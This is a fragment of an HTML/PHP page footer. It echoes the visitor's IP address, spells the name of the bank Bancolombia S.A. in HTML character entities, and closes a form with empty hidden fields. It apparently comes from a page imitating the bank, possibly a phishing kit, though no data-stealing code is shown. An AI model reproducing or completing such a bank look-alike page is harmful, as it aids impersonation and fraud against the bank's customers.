	            <div class="mua-title-text pull-left">Dirección IP: <?php echo $ip; ?></div>
	            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2021</span>&nbsp;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#46;&#65;&#46;&nbsp;&nbsp;</div>
	        </div>
</div>
<input id="device_id" name="device_id" type="hidden" value="">
<input id="userlanguage" name="userlanguage" type="hidden" value="es">
<input id="pgid" name="pgid" type="hidden" value="">
<input id="uievent" name="uievent" type="hidden" value="">
<meta http-equiv="PRAGMA" content="NO-CACHE">
<meta http-equiv="Expires" content="-1">
</form>
</body></html>